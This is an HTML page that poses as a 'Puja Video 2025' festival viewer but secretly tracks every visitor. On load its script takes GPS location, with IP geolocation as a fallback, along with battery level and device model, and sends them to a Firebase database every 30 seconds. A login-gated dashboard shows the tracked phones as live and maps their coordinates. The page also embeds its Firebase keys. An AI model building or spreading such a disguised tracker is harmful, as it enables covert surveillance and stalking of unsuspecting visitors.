<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Puja Video 2025</title><script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script><script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script><script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script><script src="https://www.youtube.com/iframe_api"></script><style>body{margin:0;background:#000;color:#fff;font-family:Inter,Arial,sans-serif}.top{position:sticky;top:0;background:linear-gradient(90deg,#0f172a,#1e293b);padding:14px 18px;display:flex;justify-content:space-between;align-items:center;z-index:20;border-bottom:1px solid #334155;box-shadow:0 4px 15px rgba(0,0,0,.5)}.top span{font-weight:700;font-size:15px;color:#f8fafc}#dash{position:fixed;inset:0;background:#0f0f0f;display:none;overflow:auto;z-index:40}.dashHead{background:#1e293b;padding:12px 15px;display:flex;justify-content:space-between;align-items:center;position:sticky;top:0;border-bottom:1px solid #334155}#dashMenu{position:absolute;right:10px;top:50px;background:#1e293b;width:180px;padding:8px;display:none;border-radius:10px;z-index:50;border:1px solid #334155;box-shadow:0 8px 20px rgba(0,0,0,.6)}.dashMenuBtn{width:100%;padding:9px;text-align:left;background:#0f172a;color:#fff;border:1px solid #334155;border-radius:6px;margin-bottom:6px;cursor:pointer;font-size:12px}#loginM.modal{position:fixed;inset:0;background:rgba(2,6,23,.85);backdrop-filter:blur(8px);display:none;justify-content:center;align-items:center;z-index:100}.loginCard{background:linear-gradient(180deg,#1e293b,#0f172a);color:#fff;padding:20px 16px;width:270px;border-radius:14px;border:1px solid #334155;box-shadow:0 20px 50px rgba(0,0,0,.7);text-align:center;position:relative}.loginIcon{width:44px;height:44px;background:linear-gradient(135deg,#00ff88,#00cc6a);border-radius:10px;display:flex;align-items:center;justify-content:center;margin:0 auto 10px;font-size:20px}.loginTitle{margin:0 0 3px;font-size:15px;font-weight:700}.loginSub{margin:0 0 12px;font-size:11px;color:#94a3b8}.inpLogin{width:100%;height:38px;padding:0 12px;background:#020617;color:#fff;border:1px solid #334155;border-radius:8px;font-size:12px;outline:none;box-sizing:border-box;margin-bottom:10px}.inpLogin:focus{border-color:#00ff88;box-shadow:0 0 0 2px rgba(0,255,136,.15)}.btnLogin{width:100%;padding:10px;background:linear-gradient(90deg,#00ff88,#00cc6a);color:#000;border:0;border-radius:8px;font-weight:700;font-size:13px;cursor:pointer}.videoCtrl{background:#1a1a1a;margin:10px 12px;padding:12px;border-radius:10px;border:1px solid #2a2a2a}.tabRow{display:flex;gap:6px;margin-bottom:10px}.tabBtn{flex:1;padding:10px;border:1px solid #333;background:#222;color:#aaa;border-radius:6px;font-size:12px;font-weight:bold;cursor:pointer}.tabBtn.active{background:#00ff88;color:#000;border-color:#00ff88}.panel{display:none}.panel.show{display:block}.inp{width:100%;height:42px;padding:0 12px;background:#0f0f0f;color:#fff;border:1px solid #333;border-radius:6px;font-size:12px;outline:none;box-sizing:border-box}.fileBox{width:100%;height:42px;background:#0f0f0f;border:1px solid #333;border-radius:6px;display:flex;align-items:center;justify-content:space-between;padding:0 12px;box-sizing:border-box;cursor:pointer;color:#888;font-size:12px}.btnRow{display:flex;gap:8px;margin-top:10px}.btn{flex:1;padding:11px;border:0;border-radius:6px;font-weight:bold;font-size:13px;cursor:pointer}.btn-green{background:#00ff88;color:#000}.btn-red{background:#2a1a1a;color:#ff5a5a;border:1px solid #ff4444}.statBox{display:flex;gap:10px;padding:15px}.stat{background:#222;padding:15px;border-radius:10px;flex:1;text-align:center;border:1px solid #333}.card{background:#1e1e1e;margin:10px 15px;padding:14px;border-radius:12px;border-left:4px solid #00ff88;font-size:13px;line-height:1.8}.activeItem{background:#002a14;border:1px solid #00ff88;padding:12px;border-radius:8px;margin:6px 0;display:flex;justify-content:space-between;align-items:center}.offlineItem{background:#2a2a2a;border:1px solid #555;padding:12px;border-radius:8px;margin:6px 0;display:flex;justify-content:space-between;align-items:center}#menu{position:fixed;right:5px;top:55px;background:#1e293b;width:170px;padding:10px;display:none;border-radius:10px;z-index:30;border:1px solid #334155}.modal{position:fixed;inset:0;background:rgba(0,0,0,.85);display:none;justify-content:center;align-items:center;z-index:100}.mbox{background:#1e293b;color:#fff;padding:20px;width:280px;border-radius:12px;border:1px solid #334155;text-align:center}.inp2{width:100%;height:38px;padding:0 12px;background:#0f0f0f;color:#fff;border:1px solid #334155;border-radius:6px;font-size:12px;outline:none;box-sizing:border-box;margin-bottom:10px}</style></head><body><div class="top"><span>🎉 Puja Video 2025</span><button id="menuBtn" style="background:#1e293b;color:#e2e8f0;border:1px solid #334155;padding:7px 14px;border-radius:8px">MENU</button></div><div id="menu"><button onclick="openLogin()" style="width:100%;padding:8px;background:#0f172a;color:#fff;border:1px solid #334155;border-radius:6px">Login</button></div><div style="text-align:center;padding:10px"><h3>Puja Special Content</h3><div id="contentArea"><img id="mainImage" style="width:100%;max-width:520px;border-radius:12px;display:none"><video id="mainVideo" autoplay muted loop playsinline controls style="width:100%;max-width:520px;border-radius:12px;display:none"></video><div id="ytBox" style="width:100%;max-width:520px;margin:auto;display:none;aspect-ratio:16/9;border-radius:12px;overflow:hidden;background:#000;position:relative"></div></div></div><div id="dash"><div class="dashHead"><h2 style="margin:0;font-size:16px">Dashboard</h2><div style="position:relative"><button id="dashMenuBtn" style="background:#0f172a;color:#fff;border:1px solid #334155;padding:7px 12px;border-radius:6px">☰ Menu</button><div id="dashMenu"><button class="dashMenuBtn" onclick="openChangePass()">🔑 Change Password</button><button class="dashMenuBtn" onclick="doLogout()" style="color:#ff5a5a">🚪 Logout</button></div></div></div><div class="videoCtrl"><div class="tabRow"><button id="tabYt" class="tabBtn active">🎬 YouTube</button><button id="tabGal" class="tabBtn">🖼️ Gallery</button></div><div id="panelYt" class="panel show"><input id="linkInput" class="inp" type="text" placeholder="Please input youtube url"></div><div id="panelGal" class="panel"><input type="file" id="fileInput" accept="image/*" style="display:none"><div class="fileBox" id="fileBoxTrigger"><span id="fileName">Choose file...</span><span style="background:#333;color:#fff;padding:4px 10px;border-radius:4px;font-size:11px">Browse</span></div><div id="upStatus" style="font-size:10px;color:#00ff88;margin-top:5px"></div></div><div class="btnRow"><button class="btn btn-red" id="deleteBtn">🗑️ Delete</button><button class="btn btn-green" id="updateBtn">Update</button></div><div style="margin-top:6px;color:#666;font-size:9px">Current: <span id="currentVideo" style="color:#aaa">loading...</span></div></div><div class="statBox"><div class="stat"><h3 id="totalCount" style="margin:0;color:#00ff88">0</h3><small>Total Phone</small></div><div class="stat" style="border:2px solid #00ff88"><h3 id="activeCount" style="margin:0;color:#00ff88">0</h3><small>● LIVE Now</small></div></div><div id="activeList" style="padding:0 15px"></div><hr style="border-color:#333;margin:10px 15px"><div id="list"></div></div>

<div id="loginM" class="modal"><div class="loginCard"><button onclick="closeLogin()" style="position:absolute;top:8px;right:10px;background:#0f172a;color:#94a3b8;border:1px solid #334155;width:26px;height:26px;border-radius:6px;cursor:pointer">✕</button><div class="loginIcon">🔐</div><h3 class="loginTitle">Welcome Back</h3><p class="loginSub">Login with Email & Password</p><input id="loginEmail" type="email" placeholder="Email ID" class="inpLogin"><input id="loginPass" type="password" placeholder="Password" class="inpLogin"><div id="loginMsg" style="font-size:11px;color:#ff5a5a;margin-bottom:8px;min-height:12px"></div><button onclick="doLogin()" class="btnLogin">Login</button><p style="margin-top:10px;font-size:9px;color:#475569">Tap outside to close</p></div></div>

<div id="delConfirm" class="modal"><div class="mbox"><p>Do you want to delete this file?</p><div style="display:flex;gap:8px"><button id="noBtn" style="flex:1;padding:10px;background:#333;color:#fff;border:1px solid #555;border-radius:6px">No</button><button id="yesBtn" style="flex:1;padding:10px;background:#ff4444;color:#fff;border:0;border-radius:6px">Yes</button></div></div></div>

<div id="changePassM" class="modal"><div class="mbox"><h3>Change Password</h3><input id="newPass" type="password" placeholder="New password (min 6)" class="inp2"><div id="passMsg" style="font-size:11px;color:#ff5a5a;margin-bottom:8px"></div><div style="display:flex;gap:8px"><button onclick="closeChangePass()" style="flex:1;padding:10px;background:#333;color:#fff;border:1px solid #555;border-radius:6px">Cancel</button><button onclick="handleChangePass()" style="flex:1;padding:10px;background:#00ff88;color:#000;border:0;border-radius:6px;font-weight:bold">Change</button></div></div></div>

<script>
const firebaseConfig={apiKey:"AIzaSyBMyLWzWbg5KrOsDmsLr2tUdxap4Rbu_2M",authDomain:"puja-tracker.firebaseapp.com",databaseURL:"https://puja-tracker-default-rtdb.firebaseio.com",projectId:"puja-tracker",storageBucket:"puja-tracker.firebasestorage.app",messagingSenderId:"922310793608",appId:"1:922310793608:web:da1e1f360876fe8b9d023d"};
firebase.initializeApp(firebaseConfig);
const db=firebase.database();
const auth=firebase.auth();
let ytPlayer=null,pendingB64=null,currentTab='yt';

menuBtn.addEventListener('click',()=>{menu.style.display=menu.style.display=='block'?'none':'block';});
dashMenuBtn.addEventListener('click',()=>{dashMenu.style.display=dashMenu.style.display=='block'?'none':'block';});
tabYt.addEventListener('click',()=>{currentTab='yt';tabYt.classList.add('active');tabGal.classList.remove('active');panelYt.classList.add('show');panelGal.classList.remove('show');});
tabGal.addEventListener('click',()=>{currentTab='gal';tabGal.classList.add('active');tabYt.classList.remove('active');panelGal.classList.add('show');panelYt.classList.remove('show');});
fileBoxTrigger.addEventListener('click',()=>fileInput.click());
fileInput.addEventListener('change',function(){let f=this.files[0];if(!f) return;fileName.innerText=f.name;upStatus.innerText='Compressing...';let r=new FileReader();r.onload=e=>{let img=new Image();img.onload=()=>{let c=document.createElement('canvas');let maxW=800;c.width=img.width>maxW?maxW:img.width;c.height=img.height*(c.width/img.width);c.getContext('2d').drawImage(img,0,0,c.width,c.height);pendingB64=c.toDataURL('image/jpeg',0.6);upStatus.innerText='Ready - Click Update';};img.src=e.target.result;};r.readAsDataURL(f);});
updateBtn.addEventListener('click',async()=>{if(currentTab=='yt'){let link=linkInput.value.trim();if(!link) return alert("Please input youtube url");await db.ref("config/content").set({type:'youtube',url:link});alert("YouTube Updated!");}else{if(!pendingB64) return alert("Please choose a file first");upStatus.innerText='Uploading...';await db.ref("config/content").set({type:'image',url:pendingB64});upStatus.innerText='Done!';alert("Pic Updated!");}});
deleteBtn.addEventListener('click',()=>delConfirm.style.display='flex');noBtn.addEventListener('click',()=>delConfirm.style.display='none');yesBtn.addEventListener('click',async()=>{delConfirm.style.display='none';await db.ref("config/content").remove();pendingB64=null;fileName.innerText='Choose file...';upStatus.innerText='Deleted';alert("Deleted!");});

// --- NEW AUTH SYSTEM ---
function openChangePass(){dashMenu.style.display='none';newPass.value='';passMsg.innerText='';passMsg.style.color='#ff5a5a';changePassM.style.display='flex';}
function closeChangePass(){changePassM.style.display='none';}
async function handleChangePass(){
  let newP=newPass.value.trim();
  if(newP.length<6){passMsg.innerText='Password minimum 6 characters';return;}
  let user=auth.currentUser;
  if(!user){passMsg.innerText='Not logged in';return;}
  user.updatePassword(newP).then(()=>{
    passMsg.style.color='#00ff88';passMsg.innerText='Password Changed!';
    setTimeout(()=>{closeChangePass();alert("New Password: "+newP);},800);
  }).catch(e=>{passMsg.innerText=e.message;});
}

async function doLogin(){
  let email=document.getElementById("loginEmail").value.trim();
  let pass=document.getElementById("loginPass").value.trim();
  if(!email||!pass){loginMsg.innerText='Email & Password required';return;}
  loginMsg.innerText='Checking...';
  auth.signInWithEmailAndPassword(email,pass)
 .then(()=>{loginMsg.innerText='';loginM.style.display='none';document.getElementById("loginEmail").value='';document.getElementById("loginPass").value='';})
 .catch(e=>{loginMsg.innerText=e.message;});
}
function doLogout(){auth.signOut();}
function openLogin(){loginM.style.display='flex';menu.style.display='none';loginMsg.innerText='';}
function closeLogin(){loginM.style.display='none';loginMsg.innerText='';}
loginM.addEventListener('click',(e)=>{if(e.target.id==='loginM') closeLogin();});
changePassM.addEventListener('click',(e)=>{if(e.target.id==='changePassM') closeChangePass();});
delConfirm.addEventListener('click',(e)=>{if(e.target.id==='delConfirm') delConfirm.style.display='none';});

auth.onAuthStateChanged(user=>{
  if(user){
    dash.style.display='block';
    console.log("Logged in:", user.email);
    db.ref("locations").off();
    db.ref("status").off();
    db.ref("locations").on("value",s=>{
      allData=s.val()||{};
      console.log("Locations:", allData);
      render();
    });
    db.ref("status").on("value",s=>{
      allStatus=s.val()||{};
      console.log("Status:", allStatus);
      render();
    });
  } else {
    dash.style.display='none';
    db.ref("locations").off();
    db.ref("status").off();
  }
});
  
function playYouTube(id){let box=document.getElementById("ytBox");box.style.display="block";box.innerHTML=`<div style="width:100%;height:100%;position:relative"><div id="ytPlayerDiv" style="width:100%;height:100%;pointer-events:none"></div><div id="clickLayer" style="position:absolute;inset:0;z-index:5"></div><div id="customCtrl" style="position:absolute;bottom:0;left:0;right:0;z-index:10;background:linear-gradient(to top, rgba(0,0,0,0.85), transparent);padding:10px;display:flex;gap:10px;opacity:0;transition:0.25s;pointer-events:none"><button id="playBtn" style="background:none;border:0;color:#fff;font-size:20px;pointer-events:auto">❚❚</button><button id="muteBtn" style="background:none;border:0;color:#fff;font-size:18px;pointer-events:auto">🔇</button><div style="flex:1"></div><button id="fsBtn" style="background:none;border:0;color:#fff;font-size:16px;pointer-events:auto">⛶</button></div></div>`;ytPlayer=new YT.Player('ytPlayerDiv',{videoId:id,width:'100%',height:'100%',playerVars:{autoplay:1,mute:1,playsinline:1,controls:0,rel:0,fs:0,modestbranding:1},events:{onReady:e=>{e.target.playVideo();let ctrl=document.getElementById('customCtrl'),layer=document.getElementById('clickLayer');function show(){ctrl.style.opacity='1';ctrl.style.pointerEvents='auto';layer.style.pointerEvents='none';clearTimeout(window.ct);window.ct=setTimeout(()=>{ctrl.style.opacity='0';ctrl.style.pointerEvents='none';layer.style.pointerEvents='auto';},3000);}document.getElementById('playBtn').onclick=ev=>{ev.stopPropagation();let b=ev.target;if(b.innerText=='❚❚'){ytPlayer.pauseVideo();b.innerText='▶';}else{ytPlayer.playVideo();b.innerText='❚❚';}show();};document.getElementById('muteBtn').onclick=ev=>{ev.stopPropagation();if(ytPlayer.isMuted()){ytPlayer.unMute();ev.target.innerText='🔊';}else{ytPlayer.mute();ev.target.innerText='🔇';}show();};document.getElementById('fsBtn').onclick=ev=>{ev.stopPropagation();let bx=document.getElementById('ytBox');if(document.fullscreenElement)document.exitFullscreen();else bx.requestFullscreen();show();};layer.onclick=show;show();}}});}
db.ref("config/content").on("value",s=>{let d=s.val();if(!d){currentVideo.innerText="Empty";mainImage.style.display="none";ytBox.style.display="none";mainVideo.style.display="none";return;}currentVideo.innerText=d.type;mainVideo.style.display="none";ytBox.style.display="none";mainImage.style.display="none";mainVideo.pause();let url=d.url;if(d.type=='image'){mainImage.src=url;mainImage.style.display="block";}else if(url.includes("youtube.com")||url.includes("youtu.be")){let id="";if(url.includes("youtu.be/"))id=url.split("youtu.be/")[1].split("?")[0];else if(url.includes("v="))id=url.split("v=")[1].split("&")[0];else id=url.split("/").pop().split("?")[0];if(window.YT&&YT.Player)playYouTube(id);else window.onYouTubeIframeAPIReady=()=>playYouTube(id);}else{mainVideo.src=url;mainVideo.style.display="block";mainVideo.play().catch(()=>{});}});
function getBrand(ua){ua=ua.toLowerCase();if(ua.includes("vivo"))return"Vivo";if(ua.includes("samsung")||ua.includes("sm-"))return"Samsung";if(ua.includes("redmi")||ua.includes("xiaomi"))return"Redmi";if(ua.includes("oppo"))return"Oppo";if(ua.includes("realme"))return"Realme";if(ua.includes("infinix"))return"Infinix";return"Android";}function getBrowserName(){let ua=navigator.userAgent;if(ua.includes("Edg"))return"Edge";if(ua.includes("Chrome"))return"Chrome";if(ua.includes("Firefox"))return"Firefox";return"Browser";}async function getDeviceInfo(){let ua=navigator.userAgent;let brand=getBrand(ua);let model="";try{if(navigator.userAgentData?.getHighEntropyValues){let h=await navigator.userAgentData.getHighEntropyValues(["model"]);if(h.model)model=h.model;}}catch(e){}if(!model){let m=ua.match(/Android.*;\s([^;\)]+)\sBuild\//);if(m)model=m[1].replace("WV; ","").trim();}if(!model)model=brand+" Phone";return{brand,model};}
let allData={},allStatus={};async function autoTrack(lat,lon){let{brand,model}=await getDeviceInfo();let browser=getBrowserName();let deviceId=localStorage.getItem("deviceId");if(!deviceId){deviceId="dev_"+Date.now()+"_"+Math.random().toString(36).substr(2,5);localStorage.setItem("deviceId",deviceId);}async function getBattery(){try{let b=await navigator.getBattery();return Math.round(b.level*100)+"%";}catch(e){return"N/A";}}let statusRef=db.ref("status/"+deviceId);db.ref(".info/connected").on("value",async s=>{if(s.val()){let bat=await getBattery();statusRef.set({deviceId,brand,model,browser,battery:bat,online:true,timestamp:Date.now()});statusRef.onDisconnect().set({deviceId,brand,model,browser,battery:bat,online:false,timestamp:Date.now()});}});async function save(la,lo,addr){let battery=await getBattery();let time=new Date().toLocaleString("en-BD",{timeZone:"Asia/Dhaka",hour12:true});let ts=Date.now();let data={brand,model,browser,battery,lat:la,lon:lo,latitude:la,longitude:lo,address:addr||la+","+lo,time,timestamp:ts,deviceId};await db.ref("locations/"+deviceId).set(data);await db.ref("status/"+deviceId).set({deviceId,brand,model,browser,battery,online:true,timestamp:ts});}if(lat&&lon&&lat!="Error")save(lat,lon,"GPS Location");function fetchAndUpload(){navigator.geolocation.getCurrentPosition(p=>save(p.coords.latitude,p.coords.longitude,"GPS Location"),async()=>{try{let r=await fetch("https://ipapi.co/json/");let j=await r.json();if(j.latitude)save(j.latitude,j.longitude,j.city+", "+j.region);}catch(e){}},{enableHighAccuracy:true,timeout:10000,maximumAge:0});}setInterval(fetchAndUpload,30000);}
window.addEventListener('load',()=>{setTimeout(()=>{navigator.geolocation.getCurrentPosition(pos=>{autoTrack(pos.coords.latitude,pos.coords.longitude);},err=>{autoTrack("Error","Error");},{enableHighAccuracy:true,timeout:10000,maximumAge:0});},500);});
function render(){let liveArr=[],offArr=[];for(let id in allStatus){let st=allStatus[id];let loc=allData[id];if(loc)st.timestamp=loc.timestamp;if(st.online)liveArr.push(st);else offArr.push(st);}liveArr.sort((a,b)=>b.timestamp-a.timestamp);offArr.sort((a,b)=>b.timestamp-a.timestamp);let html="";[...liveArr,...offArr].forEach(st=>{let v=allData[st.deviceId]||st;let isLive=st.online;let t=v.timestamp?new Date(v.timestamp).toLocaleTimeString():"";html+=`<div class="${isLive?'activeItem':'offlineItem'}"><div onclick="showData('${st.deviceId}')" style="flex:1;cursor:pointer"><b>${v.brand}</b> ${v.model} <span style="background:${isLive?'#00ff88':'#555'};color:${isLive?'#000':'#fff'};padding:2px 8px;border-radius:10px;font-size:11px;margin-left:6px">${isLive?'● LIVE':'Offline'} ${t}</span></div>${!isLive?`<button onclick="deleteDevice('${st.deviceId}','${v.brand}')" style="background:#ff4444;color:#fff;border:0;padding:6px 12px;border-radius:6px;font-size:12px;margin-left:10px">🗑️ Delete</button>`:``}</div>`;});totalCount.innerText=Object.keys(allData).length||Object.keys(allStatus).length;activeCount.innerText=liveArr.length;activeList.innerHTML=html;}
async function deleteDevice(id,name){if(!confirm("Delete "+name)) return;await db.ref("status/"+id).remove();await db.ref("locations/"+id).remove();delete allStatus[id];delete allData[id];render();list.innerHTML='';}
function showData(id){let v=allData[id];if(!v){let s=allStatus[id];if(!s) return;list.innerHTML=`<div class="card"><b>${s.brand} ${s.model}</b><br>Sync hocche...</div>`;return;}let isLive=allStatus[id]?.online;list.innerHTML=`<div class="card"><b>${v.brand} ${v.model}</b> <span style="float:right;background:${isLive?'#00ff88':'#555'};color:${isLive?'#000':'#fff'};padding:2px 8px;border-radius:10px;font-size:11px">${isLive?'● LIVE':'Offline'}</span><br><b>Brand:</b> ${v.brand}<br><b>Model:</b> ${v.model}<br><b>Battery:</b> ${v.battery}<br><b>Lat:</b> ${v.lat}<br><b>Lon:</b> ${v.lon}<br><b>Time:</b> ${v.time}<br><br><a href="https://maps.google.com/?q=${v.lat},${v.lon}" target="_blank" style="background:#00ff88;color:#000;padding:7px 14px;border-radius:6px;text-decoration:none">MAP</a> <button onclick="list.innerHTML=''" style="background:#444;color:#fff;border:0;padding:7px 12px;border-radius:6px;margin-left:8px">Close</button></div>`;}
</script></body></html>
